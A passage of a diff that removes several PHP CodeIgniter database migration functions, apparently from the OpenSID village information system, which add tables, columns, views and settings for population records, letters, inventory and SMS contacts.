-					array('id'=>1, 'nama'=>'Pindah keluar Desa/Kelurahan'),
-					array('id'=>2, 'nama'=>'Pindah keluar Kecamatan'),
-					array('id'=>3, 'nama'=>'Pindah keluar Kabupaten/Kota'),
-					array('id'=>4, 'nama'=>'Pindah keluar Provinsi'),
-				)
-			);
-		}
-  	if (!$this->db->field_exists('ref_pindah', 'log_penduduk'))
-  	{
-			// Tambah kolom
-			$fields = array();
-			$fields['ref_pindah'] = array(
-					'type' => 'TINYINT',
-					'constraint' => 4,
-					'default' => 1
-			);
-			$this->dbforge->add_column('log_penduduk', $fields);
-			$this->dbforge->add_column(
-				'log_penduduk',
-				array('CONSTRAINT `id_ref_pindah` FOREIGN KEY (`ref_pindah`) REFERENCES `ref_pindah` (`id`) ON DELETE CASCADE ON UPDATE CASCADE')
-			);
-  	}
-  }
-
-  private function migrasi_1812_ke_1901()
-  {
-  	// Tambah status dasar 'Tidak Valid'
-		$data = array(
-			'id' => 9,
-			'nama' => 'TIDAK VALID');
-		$sql = $this->db->insert_string('tweb_status_dasar', $data);
-		$sql .= " ON DUPLICATE KEY UPDATE
-				id = VALUES(id),
-				nama = VALUES(nama)";
-		$this->db->query($sql);
-  	// Tambah kolom tweb_desa_pamong
-  	if (!$this->db->field_exists('no_hp', 'komentar'))
-  	{
-			// Tambah kolom
-			$fields = array();
-			$fields['no_hp'] = array(
-					'type' => 'varchar',
-					'constraint' => 15,
-					'default' => NULL
-			);
-			$this->dbforge->add_column('komentar', $fields);
-  	}
-
-  	// Tambah kolom tweb_desa_pamong
-  	if (!$this->db->field_exists('pamong_pangkat', 'tweb_desa_pamong'))
-  	{
-			// Tambah kolom
-			$fields = array();
-			$fields['pamong_niap'] = array(
-					'type' => 'varchar',
-					'constraint' => 20,
-					'default' => NULL
-			);
-			$fields['pamong_pangkat'] = array(
-					'type' => 'varchar',
-					'constraint' => 20,
-					'default' => NULL
-			);
-			$fields['pamong_nohenti'] = array(
-					'type' => 'varchar',
-					'constraint' => 20,
-					'default' => NULL
-			);
-			$fields['pamong_tglhenti'] = array(
-					'type' => 'date',
-					'default' => NULL
-			);
-			$this->dbforge->add_column('tweb_desa_pamong', $fields);
-  	}
-
-  	// Urut tabel tweb_desa_pamong
-  	if (!$this->db->field_exists('urut', 'tweb_desa_pamong'))
-  	{
-			// Tambah kolom
-			$fields = array();
-			$fields['urut'] = array(
-					'type' => 'int',
-					'constraint' => 5
-			);
-			$this->dbforge->add_column('tweb_desa_pamong', $fields);
-  	}
-		$this->db->where('id', 18)->update('setting_modul', array('url'=>'pengurus/clear', 'aktif'=>'1'));
-		$this->db->where('id', 48)->update('setting_modul', array('url'=>'web_widget/clear', 'aktif'=>'1'));
-  }
-
-  private function migrasi_1811_ke_1812()
-  {
-  	// Ubah struktur tabel tweb_desa_pamong
-  	if (!$this->db->field_exists('id_pend', 'tweb_desa_pamong'))
-  	{
-			// Tambah kolom
-			$fields = array();
-			$fields['id_pend'] = array(
-					'type' => 'int',
-					'constraint' => 11
-			);
-			$fields['pamong_tempatlahir'] = array(
-					'type' => 'varchar',
-					'constraint' => 100,
-					'default' => NULL
-			);
-			$fields['pamong_tanggallahir'] = array(
-					'type' => 'date',
-					'default' => NULL
-			);
-			$fields['pamong_sex'] = array(
-					'type' => 'tinyint',
-					'constraint' => 4,
-					'default' => NULL
-			);
-			$fields['pamong_pendidikan'] = array(
-					'type' => 'int',
-					'constraint' => 10,
-					'default' => NULL
-			);
-			$fields['pamong_agama'] = array(
-					'type' => 'int',
-					'constraint' => 10,
-					'default' => NULL
-			);
-			$fields['pamong_nosk'] = array(
-					'type' => 'varchar',
-					'constraint' => 20,
-					'default' => NULL
-			);
-			$fields['pamong_tglsk'] = array(
-					'type' => 'date',
-					'default' => NULL
-			);
-			$fields['pamong_masajab'] = array(
-					'type' => 'varchar',
-					'constraint' => 120,
-					'default' => NULL
-			);
-			$this->dbforge->add_column('tweb_desa_pamong', $fields);
-  	}
-
-  	// Pada tweb_keluarga kosongkan nik_kepala kalau tdk ada penduduk dgn kk_level=1 dan id=nik_kepala untuk keluarga itu
-  	$kk_kosong = $this->db->select('k.id')
-  	  ->where('p.id is NULL')
-  		->from('tweb_keluarga k')
-  		->join('tweb_penduduk p', 'p.id = k.nik_kepala and p.kk_level = 1', 'left')
-  		->get()->result_array();
-  	foreach ($kk_kosong as $kk)
-  	{
-  		$this->db->where('id', $kk['id'])->update('tweb_keluarga', array('nik_kepala' => NULL));
-  	}
-
-		// Tambah surat keterangan domisili
-		$data = array(
-			'nama'=>'Keterangan Domisili',
-			'url_surat'=>'surat_ket_domisili',
-			'kode_surat'=>'S-41',
-			'jenis'=>1);
-		$sql = $this->db->insert_string('tweb_surat_format', $data);
-		$sql .= " ON DUPLICATE KEY UPDATE
-				nama = VALUES(nama),
-				url_surat = VALUES(url_surat),
-				kode_surat = VALUES(kode_surat),
-				jenis = VALUES(jenis)";
-		$this->db->query($sql);
-
-		$query = $this->db->select('1')->where('key', 'web_artikel_per_page')->get('setting_aplikasi');
-		$query->result() OR	$this->db->insert('setting_aplikasi', array('key'=>'web_artikel_per_page', 'value'=>8, 'jenis'=>'int', 'keterangan'=>'Jumlah artikel dalam satu halaman', 'kategori'=>'web_theme'));
-
-		$this->db->where('id', 42)->update('setting_modul', array('url'=>'modul/clear', 'aktif'=>'1'));
-
-		// tambah setting penomoran_surat
-		if ($this->setting->penomoran_surat == null)
-		{
-			$setting = $this->db->select('value')
-			                    ->where('key', 'nomor_terakhir_semua_surat')
-			                    ->get('setting_aplikasi')
-			                    ->row();
-			$this->db->insert(
-				'setting_aplikasi',
-				array(
-					'key' => 'penomoran_surat',
-					'value' => $setting->value ?: 2,
-					'jenis' => 'option',
-					'keterangan' => 'Penomoran surat mulai dari satu (1) setiap tahun'
-				)
-			);
-			// Hapus setting nomor_terakhir_semua_surat
-			$this->db->where('key', 'nomor_terakhir_semua_surat')->delete('setting_aplikasi');
-		}
-
-		$tb_option = 'setting_aplikasi_options';
-		if (!$this->db->table_exists($tb_option))
-		{
-			$this->dbforge->add_field(array(
-				'id' => array(
-					'type' => 'INT',
-					'constraint' => 11,
-					'unsigned' => FALSE,
-					'auto_increment' => TRUE
-				),
-				'id_setting' => array(
-					'type' => 'INT',
-					'constraint' => 11,
-					'unsigned' => FALSE
-				),
-				'value' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 512
-				)
-			));
-			$this->dbforge->add_key('id', true);
-			$this->dbforge->create_table($tb_option, false, array('ENGINE' => $this->engine));
-			$this->dbforge->add_column(
-				$tb_option,
-				array('CONSTRAINT `id_setting_fk` FOREIGN KEY (`id_setting`) REFERENCES `setting_aplikasi` (`id`) ON DELETE CASCADE ON UPDATE CASCADE')
-			);
-		}
-
-		$set = $this->db->select('s.id,o.id oid')
-		                ->where('key', 'penomoran_surat')
-		                ->join("$tb_option o", 's.id=o.id_setting', 'LEFT')
-		                ->get('setting_aplikasi s')
-		                ->row();
-		if (!$set->oid)
-		{
-			$this->db->insert_batch(
-				$tb_option,
-				array(
-					array('id'=>1, 'id_setting'=>$set->id, 'value'=>'Nomor berurutan untuk masing-masing surat masuk dan keluar; dan untuk semua surat layanan'),
-					array('id'=>2, 'id_setting'=>$set->id, 'value'=>'Nomor berurutan untuk masing-masing surat masuk dan keluar; dan untuk setiap surat layanan dengan jenis yang sama'),
-					array('id'=>3, 'id_setting'=>$set->id, 'value'=>'Nomor berurutan untuk keseluruhan surat layanan, masuk dan keluar'),
-				)
-			);
-		}
-	}
-
-  private function migrasi_1810_ke_1811()
-  {
-  	// Ubah url untuk Admin Web > Artikel, Admin Web > Dokumen, Admin Web > Menu,
-  	// Admin Web > Komentar
-		$this->db->where('id', 47)->update('setting_modul', array('url'=>'web/clear', 'aktif'=>'1'));
-		$this->db->where('id', 52)->update('setting_modul', array('url'=>'dokumen/clear', 'aktif'=>'1'));
-		$this->db->where('id', 50)->update('setting_modul', array('url'=>'komentar/clear', 'aktif'=>'1'));
-		$this->db->where('id', 49)->update('setting_modul', array('url'=>'menu/clear', 'aktif'=>'1'));
-		$this->db->where('id', 20)->update('setting_modul', array('url'=>'sid_core/clear', 'aktif'=>'1'));
-  	// Ubah nama kolom 'nik' menjadi 'id_pend' dan hanya gunakan untuk pemilik desa
-  	if ($this->db->field_exists('nik', 'data_persil'))
-  	{
-	  	$data = $this->db->select('d.*, d.nik as nama_pemilik, p.id as id_pend')
-	  		->from('data_persil d')
-	  		->join('tweb_penduduk p','p.nik = d.nik', 'left')
-	  		->get()->result_array();
-	  	foreach ($data as $persil)
-	  	{
-	  		$tulis = array();
-	  		// Kalau pemilik luar pindahkan isi kolom 'nik' sebagai nama pemilik luar
-	  		if ($persil['jenis_pemilik'] == 2 and empty($persil['pemilik_luar']))
-	  		{
-	  			$tulis['pemilik_luar'] = $persil['nama_pemilik'];
-	  			$tulis['nik'] = NULL;
-	  		}
-	  		else
-		  		// Untuk pemilik desa ganti menjadi id penduduk
-	  			$tulis['nik'] = $persil['id_pend'];
-	  		$this->db->where('id', $persil['id'])->update('data_persil', $tulis);
-	  	}
-	  	// Tambahkan relational constraint
-		  $this->dbforge->modify_column('data_persil',
-		  	array('nik' => array('name'  =>  'id_pend',	'type' => 'int', 'constraint' => 11 )));
-			$this->db->query("ALTER TABLE `data_persil` ADD INDEX `id_pend` (`id_pend`)");
-			$this->dbforge->add_column('data_persil', array(
-	    	'CONSTRAINT `persil_pend_fk` FOREIGN KEY (`id_pend`) REFERENCES `tweb_penduduk` (`id`) ON DELETE CASCADE ON UPDATE CASCADE'
-			));
-  	}
-  	// Hapus kolom tweb_penduduk_mandiri.nik
-		if ($this->db->field_exists('nik', 'tweb_penduduk_mandiri'))
-		{
-			$this->dbforge->drop_column('tweb_penduduk_mandiri', 'nik');
-		}
-		//menambahkan constraint kolom tabel
-		$sql = "SELECT *
-	    FROM INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS
-	    WHERE CONSTRAINT_NAME = 'id_pend_fk'
-			AND TABLE_NAME = 'tweb_penduduk_mandiri'";
-	  $query = $this->db->query($sql);
-	  if ($query->num_rows() == 0)
-	  {
-			$this->dbforge->add_column('tweb_penduduk_mandiri', array(
-	    	'CONSTRAINT `id_pend_fk` FOREIGN KEY (`id_pend`) REFERENCES `tweb_penduduk` (`id`) ON DELETE CASCADE ON UPDATE CASCADE'
-			));
-	  }
-
-  	// Tambah perubahan database di sini
-		// Tambah setting tombol_cetak_surat
-		$setting = $this->db->where('key','tombol_cetak_surat')->get('setting_aplikasi')->row()->id;
-		if (!$setting)
-		{
-			$this->db->insert('setting_aplikasi', array('key'=>'tombol_cetak_surat', 'value'=>FALSE, 'jenis'=>'boolean', 'keterangan'=>'Tampilkan tombol cetak langsung di form surat'));
-		}
-  }
-
-  private function migrasi_1809_ke_1810()
-  {
-		// Tambah tabel surat_keluar
-		//Perbaiki url untuk modul Surat Keluar
-		$this->db->where('id', 58)->update('setting_modul',array('url'=>'surat_keluar/clear', 'aktif'=>'1'));
-		if (!$this->db->table_exists('surat_keluar') )
-		{
-			$query = "
-				CREATE TABLE `surat_keluar` (
-					`id` int NOT NULL AUTO_INCREMENT,
-					`nomor_urut` smallint(5),
-					`nomor_surat` varchar(20),
-					`kode_surat` varchar(10),
-					`tanggal_surat` date NOT NULL,
-					`tanggal_catat` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-					`tujuan` varchar(100),
-					`isi_singkat` varchar(200),
-					`berkas_scan` varchar(100),
-					PRIMARY KEY  (`id`)
-				);
-			";
-			$this->db->query($query);
-		}
-
-  	// Tambah klasifikasi surat
-		if (!$this->db->table_exists('klasifikasi_surat') )
-		{
-			$data = array(
-				'id' => '63',
-				'modul' => 'Klasfikasi Surat',
-				'url' => 'klasifikasi/clear',
-				'aktif' => '1',
-				'ikon' => 'fa-code',
-				'urut' => '10',
-				'level' => '2',
-				'parent' => '15',
-				'hidden' => '0',
-				'ikon_kecil' => 'fa-code'
-			);
-			$sql = $this->db->insert_string('setting_modul', $data) . " ON DUPLICATE KEY UPDATE url=VALUES(url)";
-			$this->db->query($sql);
-
-			$query = "
-			CREATE TABLE IF NOT EXISTS `klasifikasi_surat` (
-			  `id` int(4) NOT NULL AUTO_INCREMENT,
-			  `kode` varchar(50) NOT NULL,
-			  `nama` varchar(250) NOT NULL,
-			  `uraian` mediumtext NOT NULL,
-				`enabled` int(2) NOT NULL DEFAULT '1',
-			  PRIMARY KEY (`id`)
-			)";
-			$this->db->query($query);
-			// Impor klasifikasi dari berkas csv
-			$this->load->model('klasifikasi_model');
-			$this->klasifikasi_model->impor(FCPATH . 'assets/import/klasifikasi_surat.csv');
-		}
-
-		//Perbaiki url untuk modul Surat Masuk dan Arsip Layanan
-		$this->db->where('url','surat_masuk')->update('setting_modul',array('url'=>'surat_masuk/clear'));
-		$this->db->where('url','keluar')->update('setting_modul',array('url'=>'keluar/clear'));
-		//Perbaiki ikon untuk modul Sekretariat
-		$this->db->where('url','sekretariat')->update('setting_modul',array('ikon'=>'fa-archive'));
-		 // Buat view untuk penduduk hidup -- untuk memudahkan query
-		if (!$this->db->table_exists('penduduk_hidup'))
-			$this->db->query("CREATE VIEW penduduk_hidup AS SELECT * FROM tweb_penduduk WHERE status_dasar = 1");
-		// update jenis pekerjaan PETANI/PERKEBUNAN ke 'PETANI/PEKEBUN'
-		// sesuai dengan issue https://github.com/OpenSID/OpenSID/issues/999
-		if ($this->db->table_exists('tweb_penduduk_pekerjaan'))
-			$this->db->where('nama', 'PETANI/PERKEBUNAN')->update(
-					'tweb_penduduk_pekerjaan',  array('nama' => 'PETANI/PEKEBUN'));
-		// buat tabel disposisi dengan relasi ke surat masuk dan tweb_desa_pamong
-		if (!$this->db->table_exists('disposisi_surat_masuk'))
-		{
-			$sql = array(
-			  'id_disposisi'  =>  array(
-				  'type' => 'INT',
-				  'constraint' => 11,
-				  'unsigned' => FALSE,
-				  'auto_increment' => TRUE
-				),
-			  'id_surat_masuk'  =>  array(
-				  'type' => 'INT',
-				  'constraint' => 11,
-				  'unsigned' => FALSE
-				),
-			  'id_desa_pamong'  =>  array(
-				  'type' => 'INT',
-				  'constraint' => 11,
-				  'unsigned' => FALSE,
-				  'null' => TRUE,
-				),
-			  'disposisi_ke' => array(
-				  'type' => 'VARCHAR',
-				  'constraint' => 50,
-				  'null' => TRUE,
-				)
-			);
-			$this->dbforge->add_field($sql);
-			$this->dbforge->add_key("id_disposisi", TRUE);
-			$this->dbforge->create_table('disposisi_surat_masuk', FALSE, array('ENGINE' => $this->engine));
-
-			//menambahkan constraint kolom tabel
-			$this->dbforge->add_column('disposisi_surat_masuk', array(
-		    	'CONSTRAINT `id_surat_fk` FOREIGN KEY (`id_surat_masuk`) REFERENCES `surat_masuk` (`id`) ON DELETE CASCADE ON UPDATE CASCADE',
-		    	'CONSTRAINT `desa_pamong_fk` FOREIGN KEY (`id_desa_pamong`) REFERENCES `tweb_desa_pamong` (`pamong_id`) ON DELETE CASCADE ON UPDATE CASCADE'
-			));
-
-			if ($this->db->field_exists('disposisi_kepada', 'surat_masuk')) {
-
-				// ambil semua data surat masuk
-				$data = $this->db->select()->from('surat_masuk')->get()->result();
-
-				// konversi data yang diperlukan
-				// ke table disposisi_surat_masuk
-				foreach ($data as $value)
-				{
-					$data_pamong = $this->db->select('pamong_id')
-						->from('tweb_desa_pamong')
-						->where('jabatan', $value->disposisi_kepada)
-						->get()->row();
-
-					$this->db->insert(
-						'disposisi_surat_masuk', array(
-							'id_surat_masuk' => $value->id,
-							'id_desa_pamong' => $data_pamong->pamong_id,
-							'disposisi_ke' => $value->disposisi_kepada
-						)
-					);
-				}
-				// hapus kolom disposisi dari surat masuk
-				$this->dbforge->drop_column('surat_masuk','disposisi_kepada');
-			}
-		}
-  }
-
-  private function migrasi_1808_ke_1809()
-  {
-	// Hapus tabel inventaris lama
-	$query = "DROP TABLE IF EXISTS mutasi_inventaris;";
-	$this->db->query($query);
-	$query = "DROP TABLE IF EXISTS inventaris;";
-	$this->db->query($query);
-	$query = "DROP TABLE IF EXISTS jenis_barang;";
-	$this->db->query($query);
-
-	// Siapkan warna polygon dan line supaya tampak di tampilan-admin baru
-		$sql = "UPDATE polygon SET color = CONCAT('#', color)
-				WHERE color NOT LIKE '#%' AND color <> ''
-		";
-		$this->db->query($sql);
-		$sql = "UPDATE line SET color = CONCAT('#', color)
-				WHERE color NOT LIKE '#%' AND color <> ''
-		";
-		$this->db->query($sql);
-
-	// Tambahkan perubahan menu untuk tampilan-admin baru
-	if (!$this->db->field_exists('parent', 'setting_modul') or strpos($this->getCurrentVersion(), '18.08') !== false)
-	{
-	  if (!$this->db->field_exists('parent', 'setting_modul'))
-	  {
-			$fields = array();
-			$fields['parent'] = array(
-				'type' => 'int',
-				'constraint' => 2,
-				'null' => FALSE,
-				'default' => 0
-			);
-			$this->dbforge->add_column('setting_modul', $fields);
-	  }
-
-	  $this->db->truncate('setting_modul');
-	  $query = "
-		INSERT INTO setting_modul (`id`, `modul`, `url`, `aktif`, `ikon`, `urut`, `level`, `parent`, `hidden`, `ikon_kecil`) VALUES
-		('1', 'Home', 'hom_sid', '1', 'fa-home', '1', '2', '0', '1', 'fa fa-home'),
-		('200', 'Info [Desa]', 'hom_desa', '1', 'fa-dashboard', '2', '2', '0', '1', 'fa fa-home'),
-		('2', 'Kependudukan', 'penduduk/clear', '1', 'fa-users', '3', '2', '0', '0', 'fa fa-users'),
-		('3', 'Statistik', 'statistik', '1', 'fa-line-chart', '4', '2', '0', '0', 'fa fa-line-chart'),
-		('4', 'Layanan Surat', 'surat', '1', 'fa-book', '5', '2', '0', '0', 'fa fa-book'),
-		('5', 'Analisis', 'analisis_master/clear', '1', '   fa-check-square-o', '6', '2', '0', '0', 'fa fa-check-square-o'),
-		('6', 'Bantuan', 'program_bantuan/clear', '1', 'fa-heart', '7', '2', '0', '0', 'fa fa-heart'),
-		('7', 'Pertanahan', 'data_persil/clear', '1', 'fa-map-signs', '8', '2', '0', '0', 'fa fa-map-signs'),
-		('8', 'Pengaturan Peta', 'plan', '1', 'fa-location-arrow', '9', '2', '9', '0', 'fa fa-location-arrow'),
-		('9', 'Pemetaan', 'gis', '1', 'fa-globe', '10', '2', '0', '0', 'fa fa-globe'),
-		('10', 'SMS', 'sms', '1', 'fa-envelope', '11', '2', '0', '0', 'fa fa-envelope'),
-		('11', 'Pengaturan', 'man_user/clear', '1', 'fa-users', '12', '1', '0', '1', 'fa-users'),
-		('13', 'Admin Web', 'web', '1', 'fa-desktop', '14', '4', '0', '0', 'fa fa-desktop'),
-		('14', 'Layanan Mandiri', 'lapor', '1', 'fa-inbox', '15', '2', '0', '0', 'fa fa-inbox'),
-		('15', 'Sekretariat', 'sekretariat', '1', 'fa-archive', '5', '2', '0', '0', 'fa fa-archive'),
-		('16', 'SID', 'hom_sid', '1', 'fa-globe', '1', '2', '1', '0', ''),
-		('17', 'Identitas [Desa]', 'hom_desa/konfigurasi', '1', 'fa-id-card', '2', '2', '200', '0', ''),
-		('18', 'Pemerintahan [Desa]', 'pengurus', '1', 'fa-sitemap', '3', '2', '200', '0', ''),
-		('19', 'Donasi', 'hom_sid/donasi', '1', 'fa-money', '4', '2', '1', '0', ''),
-		('20', 'Wilayah Administratif', 'sid_core', '1', 'fa-map', '2', '2', '200', '0', ''),
-		('21', 'Penduduk', 'penduduk/clear', '1', 'fa-user', '2', '2', '2', '0', ''),
-		('22', 'Keluarga', 'keluarga/clear', '1', 'fa-users', '3', '2', '2', '0', ''),
-		('23', 'Rumah Tangga', 'rtm/clear', '1', 'fa-venus-mars', '4', '2', '2', '0', ''),
-		('24', 'Kelompok', 'kelompok/clear', '1', 'fa-sitemap', '5', '2', '2', '0', ''),
-		('25', 'Data Suplemen', 'suplemen', '1', 'fa-slideshare', '6', '2', '2', '0', ''),
-		('26', 'Calon Pemilih', 'dpt/clear', '1', 'fa-podcast', '7', '2', '2', '0', ''),
-		('27', 'Statistik Kependudukan', 'statistik', '1', 'fa-bar-chart', '1', '2', '3', '0', ''),
-		('28', 'Laporan Bulanan', 'laporan/clear', '1', 'fa-file-text', '2', '2', '3', '0', ''),
-		('29', 'Laporan Kelompok Rentan', 'laporan_rentan/clear', '1', 'fa-wheelchair', '3', '2', '3', '0', ''),
-		('30', 'Pengaturan Surat', 'surat_master/clear', '1', 'fa-cog', '1', '2', '4', '0', ''),
-		('31', 'Cetak Surat', 'surat', '1', 'fa-files-o', '2', '2', '4', '0', ''),
-		('32', 'Arsip Layanan', 'keluar', '1', 'fa-folder-open', '3', '2', '4', '0', ''),
-		('33', 'Panduan', 'surat/panduan', '1', 'fa fa-book', '4', '2', '4', '0', ''),
-		('39', 'SMS', 'sms', '1', 'fa-envelope-open-o', '1', '2', '10', '0', ''),
-		('40', 'Daftar Kontak', 'sms/kontak', '1', 'fa-id-card-o', '2', '2', '10', '0', ''),
-		('41', 'Pengaturan SMS', 'sms/setting', '1', 'fa-gear', '3', '2', '10', '0', ''),
-		('42', 'Modul', 'modul', '1', 'fa-tags', '1', '1', '11', '0', ''),
-		('43', 'Aplikasi', 'setting', '1', 'fa-codepen', '2', '1', '11', '0', ''),
-		('44', 'Pengguna', 'man_user', '1', 'fa-users', '3', '1', '11', '0', ''),
-		('45', 'Database', 'database', '1', 'fa-database', '4', '1', '11', '0', ''),
-		('46', 'Info Sistem', 'setting/info_sistem', '1', 'fa-server', '5', '1', '11', '0', ''),
-		('47', 'Artikel', 'web/index/1', '1', 'fa-file-movie-o', '1', '4', '13', '0', ''),
-		('48', 'Widget', 'web_widget', '1', 'fa-windows', '2', '4', '13', '0', ''),
-		('49', 'Menu', 'menu/index/1', '1', 'fa-bars', '3', '4', '13', '0', ''),
-		('50', 'Komentar', 'komentar', '1', 'fa-comments', '4', '4', '13', '0', ''),
-		('51', 'Galeri', 'gallery', '1', 'fa-image', '5', '5', '13', '0', ''),
-		('52', 'Dokumen', 'dokumen', '1', 'fa-file-text', '6', '4', '13', '0', ''),
-		('53', 'Media Sosial', 'sosmed', '1', 'fa-facebook', '7', '4', '13', '0', ''),
-		('54', 'Slider', 'web/slider', '1', 'fa-film', '8', '4', '13', '0', ''),
-		('55', 'Laporan Masuk', 'lapor', '1', 'fa-wechat', '1', '2', '14', '0', ''),
-		('56', 'Pendaftar Layanan Mandiri', 'mandiri/clear', '1', 'fa-500px', '2', '2', '14', '0', ''),
-		('57', 'Surat Masuk', 'surat_masuk', '1', 'fa-sign-in', '1', '2', '15', '0', ''),
-		('58', 'Surat Keluar', '', '2', 'fa-sign-out', '2', '2', '15', '0', ''),
-		('59', 'SK Kades', 'dokumen_sekretariat/index/2', '1', 'fa-legal', '3', '2', '15', '0', ''),
-		('60', 'Perdes', 'dokumen_sekretariat/index/3', '1', 'fa-newspaper-o', '4', '2', '15', '0', ''),
-		('61', 'Inventaris', 'inventaris_tanah', '1', 'fa-cubes', '5', '2', '15', '0', ''),
-		('62', 'Peta', 'gis', '1', 'fa-globe', '1', '2', '9', '0', 'fa fa-globe');
-	  ";
-	  $this->db->query($query);
-	}
-
-	if ($this->db->table_exists('anggota_grup_kontak'))
-		return;
-	// Perubahan tabel untuk modul SMS
-	// buat table anggota_grup_kontak
-	$sql = array(
-	  'id_grup_kontak'  =>  array(
-		  'type' => 'INT',
-		  'constraint' => 11,
-		  'unsigned' => FALSE,
-		  'auto_increment' => TRUE
-		),
-	  'id_grup'  =>  array(
-		  'type' => 'INT',
-		  'constraint' => 11,
-		  'unsigned' => FALSE
-		),
-	  'id_kontak'  =>  array(
-		  'type' => 'INT',
-		  'constraint' => 11,
-		  'unsigned' => FALSE
-		)
-	  );
-	$this->dbforge->add_field($sql);
-	$this->dbforge->add_key("id_grup_kontak", TRUE);
-	$this->dbforge->create_table('anggota_grup_kontak', FALSE, array('ENGINE' => $this->engine));
-
-	//perbaikan penamaan grup agar tidak ada html url code
-	$this->db->query("UPDATE kontak_grup SET nama_grup = REPLACE(nama_grup, '%20', ' ')");
-	//memindahkan isi kontak_grup ke anggota_grup_kontak
-	$this->db->query("INSERT INTO anggota_grup_kontak (id_grup, id_kontak) SELECT b.id as id_grup, a.id_kontak FROM kontak_grup a RIGHT JOIN (SELECT id,nama_grup FROM kontak_grup GROUP BY nama_grup) b on a.nama_grup = b.nama_grup WHERE a.id_kontak <> 0");
-	//Memperbaiki record kontak_grup agar tidak duplikat
-	$this->db->query("DELETE t1 FROM kontak_grup t1 INNER JOIN kontak_grup t2  WHERE t1.id > t2.id AND t1.nama_grup = t2.nama_grup");
-
-	//modifikasi tabel kontak dan kontak_grup
-	if ($this->db->field_exists('id', 'kontak'))
-	  $this->dbforge->modify_column('kontak', array('id' => array('name'  =>  'id_kontak', 'type' =>  'INT',  'auto_increment'  =>  TRUE )));
-	if ($this->db->field_exists('id_kontak', 'kontak_grup'))
-	  $this->dbforge->drop_column('kontak_grup', 'id_kontak');
-	if ($this->db->field_exists('id', 'kontak_grup'))
-	  $this->dbforge->modify_column('kontak_grup', array('id' => array('name'  =>  'id_grup', 'type' =>  'INT',  'auto_increment'  =>  TRUE )));
-
-	//menambahkan constraint kolom tabel
-	$this->dbforge->add_column('anggota_grup_kontak',array(
-	  'CONSTRAINT `anggota_grup_kontak_ke_kontak` FOREIGN KEY (`id_kontak`) REFERENCES `kontak` (`id_kontak`) ON DELETE CASCADE ON UPDATE CASCADE',
-	  'CONSTRAINT `anggota_grup_kontak_ke_kontak_grup` FOREIGN KEY (`id_grup`) REFERENCES `kontak_grup` (`id_grup`) ON DELETE CASCADE ON UPDATE CASCADE'
-	));
-	$this->dbforge->add_column('kontak',array(
-	  'CONSTRAINT `kontak_ke_tweb_penduduk` FOREIGN KEY (`id_pend`) REFERENCES `tweb_penduduk` (`id`) ON DELETE CASCADE ON UPDATE CASCADE'
-	));
-	//buat view
-	$this->db->query("DROP VIEW IF EXISTS `daftar_kontak`");
-	$this->db->query("CREATE VIEW `daftar_kontak` AS select `a`.`id_kontak` AS `id_kontak`,`a`.`id_pend` AS `id_pend`,`b`.`nama` AS `nama`,`a`.`no_hp` AS `no_hp`,(case when (`b`.`sex` = '1') then 'Laki-laki' else 'Perempuan' end) AS `sex`,`b`.`alamat_sekarang` AS `alamat_sekarang` from (`kontak` `a` left join `tweb_penduduk` `b` on((`a`.`id_pend` = `b`.`id`)))");
-	$this->db->query("DROP VIEW IF EXISTS `daftar_grup`");
-	$this->db->query("CREATE VIEW `daftar_grup` AS select `a`.*,(select count(`anggota_grup_kontak`.`id_kontak`) from `anggota_grup_kontak` where (`a`.`id_grup` = `anggota_grup_kontak`.`id_grup`)) AS `jumlah_anggota` from `kontak_grup` `a`");
-	$this->db->query("DROP VIEW IF EXISTS `daftar_anggota_grup`");
-	$this->db->query("CREATE VIEW `daftar_anggota_grup` AS select `a`.`id_grup_kontak` AS `id_grup_kontak`,`a`.`id_grup` AS `id_grup`,`c`.`nama_grup` AS `nama_grup`,`b`.`id_kontak` AS `id_kontak`,`b`.`nama` AS `nama`,`b`.`no_hp` AS `no_hp`,`b`.`sex` AS `sex`,`b`.`alamat_sekarang` AS `alamat_sekarang` from ((`anggota_grup_kontak` `a` left join `daftar_kontak` `b` on((`a`.`id_kontak` = `b`.`id_kontak`))) left join `kontak_grup` `c` on((`a`.`id_grup` = `c`.`id_grup`)))");
-
-  }
-
-  private function migrasi_1806_ke_1807()
-  {
-	// Tambahkan perubahan database di sini
-	// Tambah kolom di tabel data_persil
-
-		// Tambah wna_lk, wna_pr di log_bulanan
-		// dan ubah lk menjadi wni_lk, dan pr menjadi wni_pr
-		if (!$this->db->field_exists('wni_pr', 'log_bulanan'))
-		{
-			$fields = array();
-			$fields['lk'] = array(
-					'name' => 'wni_lk',
-					'type' => 'int',
-					'constraint' => 11
-			);
-			$fields['pr'] = array(
-					'name' => 'wni_pr',
-					'type' => 'int',
-					'constraint' => 11
-			);
-			$this->dbforge->modify_column('log_bulanan', $fields);
-			$fields = array();
-			$fields['wna_lk'] = array(
-					'type' => 'int',
-					'constraint' => 11
-			);
-			$fields['wna_pr'] = array(
-					'type' => 'int',
-					'constraint' => 11
-			);
-			$this->dbforge->add_column('log_bulanan', $fields);
-		}
-
-		if (!$this->db->table_exists('inventaris_tanah') )
-		{
-			$query = "
-			CREATE TABLE `inventaris_tanah` (
-				`id` int(11) NOT NULL AUTO_INCREMENT,
-				`nama_barang` varchar(255) NOT NULL,
-				`kode_barang` varchar(64) NOT NULL,
-				`register` varchar(64) NOT NULL,
-				`luas` int(64) NOT NULL,
-				`tahun_pengadaan` year(4) NOT NULL,
-				`letak` varchar(255) NOT NULL,
-				`hak` varchar(255) NOT NULL,
-				`no_sertifikat` varchar(255) NOT NULL,
-				`tanggal_sertifikat` date NOT NULL,
-				`penggunaan` varchar(255) NOT NULL,
-				`asal` varchar(255) NOT NULL,
-				`harga` double NOT NULL,
-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`status` int(1) NOT NULL DEFAULT '0',
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('mutasi_inventaris_tanah') )
-		{
-			$query = "
-			CREATE TABLE `mutasi_inventaris_tanah` (
-				`id` int(11) NOT NULL AUTO_INCREMENT,
-				`id_inventaris_tanah` int(11),
-				`jenis_mutasi` varchar(255) NOT NULL,
-				`tahun_mutasi` date NOT NULL,
-				`harga_jual` double NOT NULL,
-				`sumbangkan` varchar(255) NOT NULL,
